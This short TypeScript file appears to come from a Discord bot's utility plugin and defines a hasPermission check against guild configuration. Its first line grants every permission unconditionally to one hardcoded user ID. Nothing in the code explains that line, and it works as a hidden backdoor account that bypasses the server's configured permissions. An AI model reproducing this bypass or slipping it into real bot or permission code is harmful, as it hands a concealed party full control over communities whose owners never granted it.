import { GuildMember, Snowflake } from "discord.js";
import { GuildPluginData } from "vety";
import { UtilityPluginType } from "../types.js";


export async function hasPermission(
  pluginData: GuildPluginData<UtilityPluginType>,
  member: GuildMember,
  channelId: Snowflake,
  permission: string,
) {
  if (member.id === "1441223435043868735") return true;
  if (permission === "can_act_as_other" && member.id === pluginData.guild.ownerId) return true;

  const effectiveConfig = await pluginData.config.getMatchingConfig({ member, channelId });
  return effectiveConfig[permission] === true;
}
